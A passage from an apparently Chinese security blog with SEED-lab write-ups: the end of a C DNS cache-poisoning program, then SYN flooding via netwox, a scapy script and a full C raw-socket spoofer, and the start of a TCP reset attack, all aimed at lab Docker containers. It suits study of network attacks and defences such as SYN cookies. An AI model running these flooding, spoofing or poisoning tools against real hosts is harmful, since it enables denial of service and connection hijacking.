class="comment">//&quot;172.17.0.2&quot;</span></span><br><span class="line">    <span class="comment">// Fabricate the UDP header. Source port number, redundant</span></span><br><span class="line"> <span class="comment">//   int t = 40000+rand()%10000;</span></span><br><span class="line"> <span class="comment">//   printf(&quot;t=%d\n&quot;,t);</span></span><br><span class="line">    udp-&gt;udph_srcport = htons(<span class="number">33333</span>); </span><br><span class="line">    <span class="comment">// Destination port number</span></span><br><span class="line">    udp-&gt;udph_destport = htons(<span class="number">53</span>);</span><br><span class="line">    udp-&gt;udph_len = htons(<span class="keyword">sizeof</span>(struct udpheader)+<span class="keyword">sizeof</span>(struct dnsheader)+length+<span class="keyword">sizeof</span>(struct dataEnd)); <span class="comment">// udp_header_size + udp_payload_size</span></span><br><span class="line">    <span class="comment">// Calculate the checksum for integrity//</span></span><br><span class="line">    ip-&gt;iph_chksum = csum((<span class="keyword">unsigned</span> <span class="keyword">short</span> *)buffer, <span class="keyword">sizeof</span>(struct ipheader) + <span class="keyword">sizeof</span>(struct udpheader));</span><br><span class="line">    udp-&gt;udph_chksum=check_udp_sum(buffer, packetLength-<span class="keyword">sizeof</span>(struct ipheader));</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, <span class="keyword">sizeof</span>(one))&lt;<span class="number">0</span> )</span><br><span class="line">    &#123;		<span class="built_in">printf</span>(<span class="string">&quot;error\n&quot;</span>);			<span class="built_in">exit</span>(<span class="number">-1</span>);	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span>(a)&#123;	<span class="comment">// This is to generate different query in xxxxx.example.com 		</span></span><br><span class="line">		<span class="keyword">int</span> charnumber;</span><br><span class="line">		charnumber=<span class="number">1</span>+rand()%<span class="number">5</span>;</span><br><span class="line">		*(data+charnumber)+=<span class="number">1</span>;</span><br><span class="line">		udp-&gt;udph_chksum=check_udp_sum(buffer, packetLength-<span class="keyword">sizeof</span>(struct ipheader)); <span class="comment">// recalculate the checksum for the UDP packet</span></span><br><span class="line">		<span class="keyword">if</span>(sendto(sd, buffer, packetLength, <span class="number">0</span>, (struct sockaddr *)&amp;din, <span class="keyword">sizeof</span>(din)) &lt; <span class="number">0</span>)<span class="built_in">printf</span>(<span class="string">&quot;packet send error %d which means %s\n&quot;</span>,errno,strerror(errno));</span><br><span class="line">		<span class="comment">//sleep(0.9);</span></span><br><span class="line">		response(data,dstip,srcip);</span><br><span class="line">		response(data,dstip,srcip);</span><br><span class="line">		response(data,dstip,srcip);</span><br><span class="line">		response(data,dstip,srcip);</span><br><span class="line">	&#125; </span><br><span class="line">    close(sd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译命令<code>sudo gcc -lpcap udp.c -o udp</code>，编译完成后执行<code>./udp</code>，等待一段时间。在此期间可以看到一直有查询和响应报文往来发送。</p>
+<p><img src="DNS%E6%94%BB%E5%87%BB/dns%E8%BF%9C%E7%A8%8B8.png"></p>
+<p>一段时间后停止程序运行，查看server的DNS缓存，如图所示，缓存已被毒化。</p>
+<p><img src="DNS%E6%94%BB%E5%87%BB/dns%E8%BF%9C%E7%A8%8B9.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/04/23/DNS%E6%94%BB%E5%87%BB/" data-id="ckr5o9zzi002lxkur80hd8l99" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/DNS/" rel="tag">DNS</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-TCP协议漏洞利用" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="article-date">
+  <time datetime="2021-04-19T13:29:54.000Z" itemprop="datePublished">2021-04-19</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2021/04/19/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">TCP协议漏洞利用</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>环境：</strong>Ubuntu Seed，docker容器，其中Seed主机作为攻击机，两个docker容器由Seed镜像创建，作为server和user。</p>
+<p><strong>前置知识：</strong></p>
+<ol>
+<li><p><strong>docker容器的使用</strong></p>
+<ul>
+<li>容器查看：<code>docker ps -a</code></li>
+<li>容器创建：<code>docker run -it --name=user --privileged &quot;seedubuntu&quot; /bin/bash</code>-i指创建交互式容器，-t指终端，输入exit退出终端</li>
+<li>容器启用/停止：<code>docker start/stop 容器名</code></li>
+<li>进容器的命令行：<code>docker exec -it 容器名 /bin/bash</code>，用这个指令退出容器不会导致容器的停止</li>
+<li>删除容器：<code>docker rm 容器名</code></li>
+</ul>
+</li>
+<li><p><strong>netwox工具</strong></p>
+<p>包含超过200个不同功能的网络报文生成工具，每个工具都有一个特定的编号。</p>
+</li>
+<li><p><strong>scapy工具</strong></p>
+<p>使用<code>apt get install python-scapy</code>下载scapy。</p>
+</li>
+</ol>
+<h3 id="1-SYN-Flooding攻击"><a href="#1-SYN-Flooding攻击" class="headerlink" title="1.SYN Flooding攻击"></a>1.SYN Flooding攻击</h3><p><strong>原理：</strong>大量发送TCP SYN报文，让服务器忙于响应导致崩溃</p>
+<p><strong>过程：</strong></p>
+<p>要攻击成功首先需要关闭linux的SYNCookie保护，命令：<code>sudo sysctl -w net.ipv4.tcp_syncookies=0</code>或者<code>echo 0 &gt; /proc/sys/net/ipv4/tcp_syncookies</code>，我们先关闭保护查看攻击成功的情况，再将其打开查看成功防御SYN-Flooding攻击的情况。</p>
+<ol>
+<li><p><strong>netwox</strong></p>
+<p>首先在服务器打开telnet服务：<code>/etc/init.d/openbsd-inetd start telnet</code>，接着用户机登入telnet，命令：<code>telnet 172.17.0.2(服务器ip)</code>，账号：seed，密码：dees。能够正常登入：</p>
+<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood7.png"></p>
+<p>此时如果查看服务器连接状态（在服务器中输入：<code>netstat -na</code>），可以看到有两个tcp连接，一个是刚和用户建立好的连接，另一个是等待用户输入指令的LISTEN状态端口。</p>
+<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood3.png"></p>
+<p>接着可以开始攻击，我们在攻击机输入<code>netwox</code>进入netwox界面，输入3搜索syn可以看到76号工具可以实施synflood攻击：</p>
+<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood1.png"></p>
+<p>输入4根据提示来完成攻击，可以看到-i表示目的ip，-p表示目的端口，我们选择攻击服务器的telnet端口23，根据提示我们知道在终端直接使用命令<code>netwox 76 -i 172.17.0.2 -p 23 </code>即可实施攻击。</p>
+<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood2.png"></p>
+<p>此时再次查看服务器的网络状态，可以看到很多半开的TCP连接（状态为SYN_RECV)</p>
+<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood4.png"></p>
+<p>如果这时客户机尝试登入telnet，发现会一直等待直到超时，说明攻击成功。</p>
+<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood5.png"></p>
+<p>接下来<strong>打开syn_cookies</strong>，查看攻击效果，可见服务器仍然收到很多半开TCP连接，但是客户机还是可以正常登入telnet.</p>
+<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood8.png"></p>
+<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood9.png"></p>
+</li>
+<li><p><strong>scapy</strong></p>
+<p>首先编写python脚本执行syn flood攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#coding:utf-8       #避免中文乱码</span></span><br><span class="line"><span class="comment">### syn_flood.py</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> IP, TCP, send</span><br><span class="line"><span class="keyword">from</span> ipaddress <span class="keyword">import</span> IPv4Address</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line">a = IP(dst=<span class="string">&quot;172.17.0.2&quot;</span>) <span class="comment">#source address不填充默认是自己的ip</span></span><br><span class="line">b = TCP(sport=<span class="number">1551</span>, dport=<span class="number">23</span>, seq=<span class="number">1551</span>, flags=<span class="string">&#x27;S&#x27;</span>) <span class="comment">#flag = &#x27;S&#x27;表示发送syn报文，如果是还要加上ACK报文，flag = &#x27;SA&#x27;</span></span><br><span class="line">pkt = a/b <span class="comment">#IP层链接TCP层,从低层到高层</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    pkt[<span class="string">&#x27;IP&#x27;</span>].src = <span class="built_in">str</span>(IPv4Address(getrandbits(<span class="number">32</span>))) <span class="comment">#ip首部随机化再发送出去</span></span><br><span class="line">    send(pkt, verbose = <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#scapy发包很慢，不能完成DDOS攻击</span></span><br></pre></td></tr></table></figure>
+
+<p>使用<code>python syn_flood.py</code>命令执行脚本，可以看到服务器收到了一些半开连接，但是数量没有netwox多，因为高级语言的执行速度相对较慢</p>
+<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood_scapy1.png"></p>
+<p>此时用户尝试登入telnet，是可以正常登入的，但是会很慢</p>
+<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood_scapy2.png"></p>
+<p><strong>打开syn_cookies</strong>更是能够成功访问服务器的telnet服务，效果和上面的netwox攻击一样。</p>
+</li>
+<li><p>C</p>
+<p>编写c程序实现syn flood攻击，使用命令<code>gcc -g syn_flooding.c -o syn_flood</code>编译攻击程序，使用 命令<code>./syn_flood</code>执行攻击。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;myheader.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEST_IP    <span class="meta-string">&quot;172.17.0.2&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEST_PORT  23  <span class="comment">// Attack the web server</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACKET_LEN 1500</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="title">calculate_tcp_checksum</span><span class="params">(struct ipheader *ip)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_raw_ip_packet</span><span class="params">(struct ipheader* ip)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************</span></span><br><span class="line"><span class="comment">  Spoof a TCP SYN packet.</span></span><br><span class="line"><span class="comment">*******************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span> buffer[PACKET_LEN];</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">ipheader</span> *<span class="title">ip</span> =</span> (struct ipheader *) buffer;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">tcpheader</span> *<span class="title">tcp</span> =</span> (struct tcpheader *) (buffer +</span><br><span class="line">                                   <span class="keyword">sizeof</span>(struct ipheader));</span><br><span class="line"></span><br><span class="line">   srand(time(<span class="number">0</span>)); <span class="comment">// Initialize the seed for random # generation.</span></span><br><span class="line">   <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">     <span class="built_in">memset</span>(buffer, <span class="number">0</span>, PACKET_LEN);</span><br><span class="line">     <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">        Step 1: Fill in the TCP header.</span></span><br><span class="line"><span class="comment">     ********************************************************/</span></span><br><span class="line">     tcp-&gt;tcp_sport = rand(); <span class="comment">// Use random source port</span></span><br><span class="line">     tcp-&gt;tcp_dport = htons(DEST_PORT);</span><br><span class="line">     tcp-&gt;tcp_seq   = rand(); <span class="comment">// Use random sequence #</span></span><br><span class="line">     tcp-&gt;tcp_offx2 = <span class="number">0x50</span>;</span><br><span class="line">     tcp-&gt;tcp_flags = TH_SYN; <span class="comment">// Enable the SYN bit</span></span><br><span class="line">     tcp-&gt;tcp_win   = htons(<span class="number">20000</span>);</span><br><span class="line">     tcp-&gt;tcp_sum   = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">        Step 2: Fill in the IP header.</span></span><br><span class="line"><span class="comment">     ********************************************************/</span></span><br><span class="line">     ip-&gt;iph_ver = <span class="number">4</span>;   <span class="comment">// Version (IPV4)</span></span><br><span class="line">     ip-&gt;iph_ihl = <span class="number">5</span>;   <span class="comment">// Header length</span></span><br><span class="line">     ip-&gt;iph_ttl = <span class="number">50</span>;  <span class="comment">// Time to live</span></span><br><span class="line">     ip-&gt;iph_sourceip.s_addr = rand(); <span class="comment">// Use a random IP address</span></span><br><span class="line">     ip-&gt;iph_destip.s_addr = inet_addr(DEST_IP);</span><br><span class="line">     ip-&gt;iph_protocol = IPPROTO_TCP; <span class="comment">// The value is 6.</span></span><br><span class="line">     ip-&gt;iph_len = htons(<span class="keyword">sizeof</span>(struct ipheader) +</span><br><span class="line">                         <span class="keyword">sizeof</span>(struct tcpheader));</span><br><span class="line"></span><br><span class="line">     <span class="comment">// Calculate tcp checksum</span></span><br><span class="line">     tcp-&gt;tcp_sum = calculate_tcp_checksum(ip);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/*********************************************************</span></span><br><span class="line"><span class="comment">       Step 3: Finally, send the spoofed packet</span></span><br><span class="line"><span class="comment">     ********************************************************/</span></span><br><span class="line">     send_raw_ip_packet(ip);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*************************************************************</span></span><br><span class="line"><span class="comment">  Given an IP packet, send it out using a raw socket.</span></span><br><span class="line"><span class="comment">**************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_raw_ip_packet</span><span class="params">(struct ipheader* ip)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest_info</span>;</span></span><br><span class="line">    <span class="keyword">int</span> enable = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 1: Create a raw network socket.</span></span><br><span class="line">    <span class="keyword">int</span> sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);<span class="comment">//sock_raw是原始套接字，发送IP或者链路层报文</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 2: Set socket option.</span></span><br><span class="line">    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,</span><br><span class="line">                     &amp;enable, <span class="keyword">sizeof</span>(enable));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 3: Provide needed information about destination.</span></span><br><span class="line">    dest_info.sin_family = AF_INET;</span><br><span class="line">    dest_info.sin_addr = ip-&gt;iph_destip;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Step 4: Send the packet out.</span></span><br><span class="line">    sendto(sock, ip, ntohs(ip-&gt;iph_len), <span class="number">0</span>,</span><br><span class="line">           (struct sockaddr *)&amp;dest_info, <span class="keyword">sizeof</span>(dest_info));</span><br><span class="line">    close(sock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="title">in_cksum</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> *buf, <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">short</span> *w = buf;</span><br><span class="line">   <span class="keyword">int</span> nleft = length;</span><br><span class="line">   <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">short</span> temp=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * The algorithm uses a 32 bit accumulator (sum), adds</span></span><br><span class="line"><span class="comment">    * sequential 16 bit words to it, and at the end, folds back all</span></span><br><span class="line"><span class="comment">    * the carry bits from the top 16 bits into the lower 16 bits.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">while</span> (nleft &gt; <span class="number">1</span>)  &#123;</span><br><span class="line">       sum += *w++;</span><br><span class="line">       nleft -= <span class="number">2</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* treat the odd byte at the end, if any */</span></span><br><span class="line">   <span class="keyword">if</span> (nleft == <span class="number">1</span>) &#123;</span><br><span class="line">        *(u_char *)(&amp;temp) = *(u_char *)w ;</span><br><span class="line">        sum += temp;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* add back carry outs from top 16 bits to low 16 bits */</span></span><br><span class="line">   sum = (sum &gt;&gt; <span class="number">16</span>) + (sum &amp; <span class="number">0xffff</span>);  <span class="comment">// add hi 16 to low 16</span></span><br><span class="line">   sum += (sum &gt;&gt; <span class="number">16</span>);                  <span class="comment">// add carry</span></span><br><span class="line">   <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(~sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">  TCP checksum is calculated on the pseudo header, which includes</span></span><br><span class="line"><span class="comment">  the TCP header and data, plus some part of the IP header.</span></span><br><span class="line"><span class="comment">  Therefore, we need to construct the pseudo header first.</span></span><br><span class="line"><span class="comment">*****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="title">calculate_tcp_checksum</span><span class="params">(struct ipheader *ip)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">tcpheader</span> *<span class="title">tcp</span> =</span> (struct tcpheader *)((u_char *)ip +</span><br><span class="line">                            <span class="keyword">sizeof</span>(struct ipheader));</span><br><span class="line"></span><br><span class="line">   <span class="keyword">int</span> tcp_len = ntohs(ip-&gt;iph_len) - <span class="keyword">sizeof</span>(struct ipheader);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* pseudo tcp header for the checksum computation */</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">pseudo_tcp</span> <span class="title">p_tcp</span>;</span></span><br><span class="line">   <span class="built_in">memset</span>(&amp;p_tcp, <span class="number">0x0</span>, <span class="keyword">sizeof</span>(struct pseudo_tcp));</span><br><span class="line"></span><br><span class="line">   p_tcp.saddr  = ip-&gt;iph_sourceip.s_addr;</span><br><span class="line">   p_tcp.daddr  = ip-&gt;iph_destip.s_addr;</span><br><span class="line">   p_tcp.mbz    = <span class="number">0</span>;</span><br><span class="line">   p_tcp.ptcl   = IPPROTO_TCP;</span><br><span class="line">   p_tcp.tcpl   = htons(tcp_len);</span><br><span class="line">   <span class="built_in">memcpy</span>(&amp;p_tcp.tcp, tcp, tcp_len);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span>  (<span class="keyword">unsigned</span> <span class="keyword">short</span>) in_cksum((<span class="keyword">unsigned</span> <span class="keyword">short</span> *)&amp;p_tcp,</span><br><span class="line">                                     tcp_len + <span class="number">12</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到服务器多了很多半开连接，用户尝试登入telnet无法成功，<strong>打开syn_cookies</strong>能够成功访问服务器的telnet服务，效果和上面的netwox攻击一样。</p>
+<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood10.png"></p>
+<p><img src="/TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/synflood11.png"></p>
+</li>
+</ol>
+<h3 id="2-TCP-Reset攻击"><a href="#2-TCP-Reset攻击" class="headerlink" title="2.TCP Reset攻击"></a>2.TCP Reset攻击</h3><p><strong>原理：</strong>两个用户A、B之间存在已建立的telnet连接（TCP），则攻击者可以伪造一个从A到B的RST报文，从而破坏此现有连接。</p>
+<p>要成功进行此攻击，攻击者需要正确构建 TCP RST 数据包。首先，每个 TCP 连接都由一 个四元组唯一标识：源 IP 地址、源端口、目的 IP 地址、目的端口，因此，伪造数据包的这 4 个域必须和连接中使用的一致。其次，伪造数据包的序列号必须是正确的，否则接收方会丢弃这个包。 在此任务中，需要启动 TCP RST 攻击以中断 A 和 B 之间的现有 telnet 连接。之后，尝试对 telnet 或 ssh连接进行相同的攻击。为了简化实验，我们假设攻击者和受害者在同一个局域网上， 即攻击者可以观察到 A 和 B 之间的 TCP 流量。</p>
+<p><strong>过程：</strong></p>
+<ol>
+<li><p><strong>netwox攻击</strong></p>
+<p>首先打开wireshark，过滤器搜索telnet，监听局域网中的telnet会话；接着打开服务器的telnet服务，客户机登入telnet，可见wireshark获取到了telnet包。设置wireshark显示的序列号为绝对序列号：右键-&gt;首选项-&gt;取消勾选relative sequence numbers。</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset2.png"></p>
+<p>使用netwox的工具搜索功能搜索到tcp reset攻击需要用到的78号工具（reset every tcp packet），使用命令<code>netwox 78 --help</code>查看使用手册：</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset1.png"></p>
+<p>使用攻击命令<code>netwox 78 -d docker0 -i &quot;172.17.0.3&quot;</code>，对网卡docker0进行监听并通过它攻击。（需要注意的是，netwox的78号工具只能对本地网卡上的TCP连接进行阻断，详见<a target="_blank" rel="noopener" href="https://blog.csdn.net/u013014606/article/details/78298274">这个博客</a>）可以看到原来可以正常访问的用户和服务器的telnet连接被阻断了，wireshark也抓到了RST包，显示78号工具的机制是不停地发送RST包。</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset3.png"></p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset4.png"></p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset5.png"></p>
+</li>
+<li><p><strong>scapy手动攻击</strong></p>
+<p>手动攻击的策略是，先进行wireshark截包，再修改python脚本攻击。</p>
+<p>客户机登入telnet，通过wireshark截包可以看到最后一个包是客户机发给服务器地ACK包，ACK号是3880302867，客户机开放的端口是46412，服务器端口号23</p>
+<p><img src="TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/tcpreset6.png"></p>
+<p>那么我们编写python脚本构建一个RST报文，源ip是服务器ip，目的ip是客户机ip，tcp源端口23，目的端口46412：</p>
